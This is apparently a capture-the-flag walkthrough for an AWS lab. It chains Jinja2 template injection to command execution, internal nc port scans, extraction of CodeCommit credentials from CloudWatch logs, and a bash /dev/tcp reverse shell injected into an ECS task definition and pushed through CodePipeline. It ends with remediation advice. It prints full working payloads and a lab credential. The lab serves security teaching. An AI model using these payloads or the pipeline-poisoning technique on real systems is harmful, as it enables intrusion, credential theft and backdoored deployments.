# Watchdog Trap - Walkthrough

> **Spoiler Warning**: This document contains the complete solution.

## Attack Path

```mermaid
flowchart TB
    A[BeaverDam Incident Report Generator] --> B[SSTI Discovery]
    B --> C[RCE via Jinja2]
    C --> D[Internal Network Recon]
    D --> E[Prowler: CloudWatch KMS FAIL]
    E --> F[Steampipe: SQL Query Logs]
    F --> G[Git Credentials Extracted]
    G --> H[CodeCommit Clone + Inject Reverse Shell]
    H --> I[git push → CodePipeline Trigger]
    I --> J[ECS Blue/Green Deploy]
    J --> K[Reverse Shell → echo $FLAG]
    K --> L[FLAG]
```

---

## Step 1: Reconnaissance

Access the web application and identify its functionality.

```bash
# Get the webapp URL from Terraform output
cd terraform
terraform output webapp_url
```

Open the URL in your browser. You'll see the **BeaverDam Incident Report Generator**.

Key observations:
- A form with fields: **Service Name**, **Incident Time**, **Owner**, **Summary**
- "Powered by Flask" hint in the footer
- Submit button generates an incident report

### Method 1: Using Browser

1. Open `http://<WEBAPP_IP>` in your browser
2. Observe the form fields and page structure
3. Note the "Powered by Flask" footer hint — this suggests a Python/Jinja2 template engine

### Method 2: Using CLI

```bash
curl -s http://<WEBAPP_IP>/ | grep -i "flask\|jinja\|template"
```

---

## Step 2: SSTI Discovery

Test for Server-Side Template Injection (SSTI) in the Summary field.

Jinja2 templates evaluate expressions inside `{{ }}`. If user input is passed directly to `render_template_string()`, arbitrary expressions can be injected.

### Method 1: Using Browser

1. In the **Summary** field, enter:
   ```
   {{7*7}}
   ```
2. Fill in any Service Name and click **Generate Report**
3. The report output shows **49** instead of the literal string `{{7*7}}`

**SSTI confirmed.** The application renders user input as a Jinja2 template.

### Method 2: Using CLI

```bash
curl -s -X POST http://<WEBAPP_IP>/ \
  --data-urlencode "service=test" \
  --data-urlencode "incident_time=2026-01-01" \
  --data-urlencode "owner=test" \
  --data-urlencode "summary={{7*7}}" | grep "49"
```

Output:
```
49
```

---

## Step 3: Remote Code Execution via SSTI

Escalate SSTI to arbitrary OS command execution using Jinja2's Python object access.

Flask's `config` object has access to Python globals, which can be used to reach the `os` module.

### Method 1: Using Browser

1. In the **Summary** field, enter:
   ```
   {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
   ```
2. Submit the form

Output in the report:
```
uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
```

**RCE confirmed.**

### Method 2: Using CLI

```bash
# Helper function for SSTI execution
ssti() {
  curl -s -X POST http://<WEBAPP_IP>/ \
    --data-urlencode "service=t" \
    --data-urlencode "incident_time=t" \
    --data-urlencode "owner=t" \
    --data-urlencode "summary={{config.__class__.__init__.__globals__['os'].popen('$1').read()}}"
}

ssti "id"
```

Output:
```
uid=1000(www-data) gid=1000(www-data) groups=1000(www-data)
```

---

## Step 4: Internal Network Reconnaissance

Discover internal hosts and services from inside the webapp server.

### 4.1 Find Internal IP

```
{{config.__class__.__init__.__globals__['os'].popen('ip addr show eth0').read()}}
```

Output:
```
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 10.0.1.15/24 brd 10.0.1.255 scope global eth0
```

### 4.2 Port Scan Internal Subnets

Scan the tools subnet for Prowler (9090) and Steampipe (9194):

**Scan port 9090:**
```
{{config.__class__.__init__.__globals__['os'].popen('for i in $(seq 1 254); do (nc -zv -w1 10.0.6.$i 9090 2>&1 | grep -v refused) & done; wait').read()}}
```

Output:
```
Connection to 10.0.6.239 9090 port [tcp/*] succeeded!
```

**Scan port 9194:**
```
{{config.__class__.__init__.__globals__['os'].popen('for i in $(seq 1 254); do (nc -zv -w1 10.0.6.$i 9194 2>&1 | grep -v refused) & done; wait').read()}}
```

Output:
```
Connection to 10.0.6.119 9194 port [tcp/*] succeeded!
```

**Found:**
| Service | Internal IP | Port |
|---------|------------|------|
| Prowler | `10.0.6.239` | 9090 |
| Steampipe | `10.0.6.119` | 9194 |

> **Note:** Internal IPs are assigned dynamically. Your values will differ.

---

## Step 5: Prowler Dashboard — CloudWatch KMS FAIL

Access the internal Prowler security dashboard to discover CI/CD pipeline intelligence.

### Method 1: Using Browser (SSTI Payload)

In the Summary field:
```
{{config.__class__.__init__.__globals__['os'].popen('curl -s http://10.0.6.239:9090/').read()}}
```

Look for the failed CloudWatch check:

```html
[MEDIUM] cloudwatch_log_group_kms_encryption_enabled — FAIL
Resource: arn:aws:logs:us-east-1:123456789012:log-group:/corp/deploy-pipeline
```

### Method 2: Using CLI

```bash
ssti "curl -s http://10.0.6.239:9090/" | grep -A2 "kms_encryption"
```

**Key findings:**
- CloudWatch log group `/corp/deploy-pipeline` has **no KMS encryption**
- This log group contains CI/CD build logs — potentially with sensitive data in plaintext

---

## Step 6: Steampipe SQL Console — Query CloudWatch Logs

Steampipe runs a Flask SQL query interface on port 9194 that can query AWS APIs including CloudWatch logs via `aws_cloudwatch_log_event`.

### 6.1 Verify Steampipe is Running

```
{{config.__class__.__init__.__globals__['os'].popen('curl -s http://10.0.6.119:9194/').read()}}
```

### 6.2 List Available Log Groups

```
{{config.__class__.__init__.__globals__['os'].popen('curl -s -X POST http://10.0.6.119:9194/query -H "Content-Type: application/json" -d "{\"sql\":\"select log_group_name from aws_cloudwatch_log_group limit 20\"}"').read()}}
```

Output:
```json
[{"log_group_name": "/corp/deploy-pipeline"}]
```

### 6.3 Query Recent Log Events

```
{{config.__class__.__init__.__globals__['os'].popen('curl -s -X POST http://10.0.6.119:9194/query -H "Content-Type: application/json" -d "{\"sql\":\"select log_stream_name, message, timestamp from aws_cloudwatch_log_event where log_group_name = \'/corp/deploy-pipeline\' order by timestamp desc limit 50\"}"').read()}}
```

Output (excerpt):
```json
[
  {"message": "Cloning https://dev-user-at-813333281808:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config", "timestamp": "2026-05-01T00:58:12Z"},
  ...
]
```

---

## Step 7: Git Credential Extraction

The `Cloning https://...` log entry contains CodeCommit HTTPS Git credentials hardcoded in the CodeBuild buildspec.

### 7.1 Search for Clone Log

Use a targeted SQL query:

```
{{config.__class__.__init__.__globals__['os'].popen('curl -s -X POST http://10.0.6.119:9194/query -H "Content-Type: application/json" -d "{\"sql\":\"select message from aws_cloudwatch_log_event where log_group_name = \'/corp/deploy-pipeline\' and message like \'%Cloning https://%\' limit 5\"}"').read()}}
```

Output:
```json
[{"message": "Cloning https://dev-user-at-813333281808:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config"}]
```

### 7.2 Parse the Credentials

Extract from the URL:
```
https://<USERNAME>:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
```

Example:
```
Username: dev-user-at-813333281808
Password: aPGIl74wWyZC0HKpHnXUzM0LUYTlxzZRZv0WThIrTEjCC3iURHrbqUQNYhU=
```

> **Note:** If the password contains `/`, it will appear URL-encoded as `%2F`. Use the encoded form when cloning.

---

## Step 8: Set Up Reverse Shell Listener

Before modifying the CodeCommit repository, set up a listener to catch the reverse shell.

### Option A: Direct Listener (if you have a public IP)

```bash
nc -lvnp 4444
```

### Option B: Pinggy TCP Tunnel (for NAT/home network)

```bash
ssh -p 443 -R0:localhost:4444 tcp@a.pinggy.io
```

Pinggy will print a public address:
```
Forwarding: tcp://umvpv-14-36-96-117.run.pinggy-free.link:38369 -> localhost:4444
```

In a second terminal, start the listener:
```bash
nc -lvnp 4444
```

Note the **hostname** and **port** — you'll embed these in the container command.

---

## Step 9: CodeCommit Clone & Payload Injection

### 9.1 Clone the Repository

```bash
git clone https://dev-user-at-813333281808:<PASSWORD>@git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
cd beaverdam-config
```

### 9.2 Inspect task-definition.json

```bash
cat task-definition.json
```

Output:
```json
{
  "family": "beaverdam-app",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "executionRoleArn": "arn:aws:iam::123456789012:role/beaverdam-ecs-task-execution-role",
  "containerDefinitions": [
    {
      "name": "beaverdam-app",
      "image": "<IMAGE1_NAME>",
      "essential": true,
      "portMappings": [{"containerPort": 3000, "protocol": "tcp"}],
      "secrets": [{"name": "FLAG", "valueFrom": "arn:aws:secretsmanager:us-east-1:123456789012:secret:beaverdam/flag-XXXXXX"}]
    }
  ]
}
```

Notice the `FLAG` secret is injected into the container as an environment variable via `secrets`.

### 9.3 Inject Reverse Shell Command

Add a `command` field to `containerDefinitions[0]`:

```json
"command": ["bash", "-c", "bash -i >& /dev/tcp/<ATTACKER_HOST>/<PORT> 0>&1 & node server.js"]
```

Example after modification:
```json
{
  "family": "beaverdam-app",
  "networkMode": "awsvpc",
  "requiresCompatibilities": ["FARGATE"],
  "cpu": "256",
  "memory": "512",
  "executionRoleArn": "arn:aws:iam::123456789012:role/beaverdam-ecs-task-execution-role",
  "containerDefinitions": [
    {
      "name": "beaverdam-app",
      "image": "<IMAGE1_NAME>",
      "essential": true,
      "command": ["bash", "-c", "bash -i >& /dev/tcp/umvpv-14-36-96-117.run.pinggy-free.link/38369 0>&1 & node server.js"],
      "portMappings": [{"containerPort": 3000, "protocol": "tcp"}],
      "secrets": [{"name": "FLAG", "valueFrom": "arn:aws:secretsmanager:us-east-1:123456789012:secret:beaverdam/flag-XXXXXX"}]
    }
  ]
}
```

> **Critical:** Use `["bash", "-c", "..."]` (not `sh`) because `/dev/tcp` is a bash built-in. The `&` runs the reverse shell in the background so `node server.js` also starts, keeping the ECS task alive.

### 9.4 Commit and Push

```bash
git config user.email "ops@beaverdam.internal"
git config user.name "BeaverDam Ops"
git add task-definition.json
git commit -m "update task definition"
git push origin main
```

Output:
```
To https://git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
   a1b2c3d..e4f5a6b  main -> main
```

**Push succeeded.** CodePipeline's `PollForSourceChanges` will detect the commit and trigger the pipeline within 1 minute.

---

## Step 10: CodePipeline Execution & Blue/Green Deployment

### 10.1 Monitor Pipeline Status (Optional)

```bash
aws codepipeline get-pipeline-state \
  --name beaverdam-pipeline \
  --profile GnawLab --region us-east-1
```

Pipeline stages:
1. **Source** (~1 min): CodePipeline detects the CodeCommit push
2. **Build** (~3-5 min): CodeBuild builds the Docker image and pushes to ECR
3. **Deploy** (~3-5 min): CodeDeploy performs ECS Blue/Green deployment

Total wait time: approximately **5–10 minutes**.

### 10.2 Watch for Reverse Shell

Keep your `nc` listener running:

```bash
nc -lvnp 4444
```

When the new ECS task starts:
```
Connection from 54.x.x.x:12345
bash: cannot set terminal process group (-1): Inappropriate ioctl for device
bash: no job control in this shell
root@ip-10-0-2-47:/#
```

---

## Step 11: Capture the FLAG

```bash
echo $FLAG
```

Output:
```
FLAG{d3pl0y_p1p3l1n3_h1j4ck_2026}
```

---

## Attack Chain Summary

```
1. BeaverDam Incident Report Generator (http://<WEBAPP_IP>)
   ↓ SSTI via Summary field: {{7*7}} → 49
2. Jinja2 SSTI → RCE
   ↓ config.__class__.__init__.__globals__['os'].popen('id')
3. Internal Network Scan
   ↓ nc -zv 10.0.6.X 9090/9194 (via SSTI)
4. Prowler Dashboard (10.0.6.X:9090)
   ↓ cloudwatch_log_group_kms_encryption_enabled FAIL
   ↓ Log group: /corp/deploy-pipeline
5. Steampipe SQL Console (10.0.6.Y:9194)
   ↓ POST /query → aws_cloudwatch_log_event
6. CloudWatch Log Event
   ↓ Cloning https://dev-user-at-813333281808:<PASSWORD>@git-codecommit...
7. CodeCommit Clone (beaverdam-config)
   ↓ task-definition.json modification: add bash reverse shell command
8. git push origin main
   ↓ CodePipeline PollForSourceChanges triggers automatically
9. CodeBuild → ECR push → CodeDeploy ECS Blue/Green
   ↓ ~5-10 min
10. ECS Task starts with injected command
    ↓ bash -i >& /dev/tcp/<ATTACKER>/PORT 0>&1
11. nc -lvnp 4444 catches shell → echo $FLAG
    ↓
12. FLAG{d3pl0y_p1p3l1n3_h1j4ck_2026}
```

---

## Key Techniques

### SSTI RCE Payload

```python
# Basic RCE via Flask config globals
{{config.__class__.__init__.__globals__['os'].popen('COMMAND').read()}}
```

### Internal Port Scan via SSTI

```bash
for i in $(seq 1 254); do (nc -zv -w1 10.0.6.$i 9090 2>&1 | grep -v refused) & done; wait
```

### Steampipe CloudWatch Log Query

```sql
select message, timestamp
from aws_cloudwatch_log_event
where log_group_name = '/corp/deploy-pipeline'
  and message like '%Cloning https://%'
order by timestamp desc
limit 10;
```

### ECS Task Definition Reverse Shell Injection

```json
"command": ["bash", "-c", "bash -i >& /dev/tcp/<HOST>/<PORT> 0>&1 & node server.js"]
```

---

## Lessons Learned

### 1. Never Pass User Input to Template Engines

```python
# VULNERABLE
return render_template_string(f"<p>{user_input}</p>")

# SECURE
return render_template('report.html', summary=escape(user_input))
```

### 2. Never Hardcode Credentials in Buildspecs

```yaml
# VULNERABLE
phases:
  pre_build:
    commands:
      - git clone https://dev-user:SuperSecret@git-codecommit...

# SECURE — use IAM role with codecommit:GitPull, no credentials needed
phases:
  pre_build:
    commands:
      - git clone https://git-codecommit.us-east-1.amazonaws.com/v1/repos/beaverdam-config
```

### 3. Encrypt CloudWatch Logs with KMS

```hcl
resource "aws_cloudwatch_log_group" "pipeline" {
  name       = "/corp/deploy-pipeline"
  kms_key_id = aws_kms_key.logs.arn
}
```

### 4. Restrict Internal Service Access via Security Groups

Prowler and Steampipe should not be reachable from the webapp subnet. Use separate security groups per tier and deny cross-tier access that isn't required.

### 5. Protect Main Branch in CodeCommit

```json
{
  "Effect": "Deny",
  "Action": ["codecommit:GitPush"],
  "Resource": "arn:aws:codecommit:us-east-1:*:beaverdam-config",
  "Condition": {
    "StringEqualsIfExists": {
      "codecommit:References": ["refs/heads/main"]
    }
  }
}
```

---

## Remediation

### Secure Flask Application

```python
from flask import render_template, request
from markupsafe import escape

@app.route('/', methods=['GET', 'POST'])
def index():
    summary = escape(request.form.get('summary', ''))
    return render_template('report.html', summary=summary)
```

### Secure CodeBuild IAM Policy

```json
{
  "Effect": "Allow",
  "Action": ["codecommit:GitPull"],
  "Resource": "arn:aws:codecommit:us-east-1:*:beaverdam-config"
}
```

### Additional Security Measures

1. **AWS WAF**: Block SSTI patterns (`{{`, `__class__`, `__globals__`) at the ALB
2. **VPC Security Groups**: Isolate webapp subnet from tools subnet
3. **CloudTrail + GuardDuty**: Alert on anomalous CodeCommit push patterns
4. **Branch Protection**: Require pull request review for `main` branch pushes
5. **CloudWatch KMS**: Encrypt all log groups containing build output
